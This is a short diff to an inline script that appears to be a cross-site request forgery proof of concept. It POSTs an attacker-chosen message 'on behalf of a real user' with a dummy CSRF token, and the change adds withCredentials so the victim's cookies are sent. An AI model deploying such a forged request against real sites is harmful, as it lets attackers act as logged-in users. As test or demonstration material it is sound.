@@ -11,6 +11,9 @@
 			data: {
 				message: 'POST with any payload the attacker wants... on behalf of a real user...',
 				csrfmiddlewaretoken: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+			},
+			xhrFields: {
+				withCredentials: true
 			}
 		});
 	</script>
